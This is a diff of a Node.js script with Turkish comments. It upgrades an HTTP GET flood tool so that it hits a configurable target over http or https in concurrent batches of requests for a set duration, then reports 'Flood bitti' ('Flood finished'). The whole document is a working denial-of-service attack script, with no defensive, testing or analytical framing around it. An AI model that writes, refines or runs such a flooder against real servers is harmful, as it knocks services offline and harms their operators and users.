@@ -1,17 +1,26 @@
-const http = require('http');
+// Artık http ve https çalışır
+const url = new URL(params.target);
+const client = url.protocol === 'https:' ? https : http;
 const end = Date.now() + (params.duration * 1000);
 
-function getFlood() {
-    const url = new URL(params.target);
-    
-    while (Date.now() < end) {
-        for (let i = 0; i < 100; i++) {
-            http.get(url, (res) => {
-                res.on('data', () => {});
-            }).on('error', () => {});
-        }
-    }
-    console.log(`[+] GET Flood bitti: ${params.target}`);
+function sendRequest() {
+    return new Promise((resolve) => {
+        client.get(url, (res) => {
+            res.on('data', () => {});
+            res.on('end', resolve);
+        }).on('error', () => resolve());
+    });
 }
 
-getFlood();
+async function flood() {
+    while (Date.now() < end) {
+        const promises = [];
+        for (let i = 0; i < (params.requests || 100); i++) {
+            promises.push(sendRequest());
+        }
+        await Promise.all(promises);
+    }
+    console.log(`Flood bitti: ${params.target}`);
+}
+
+flood();
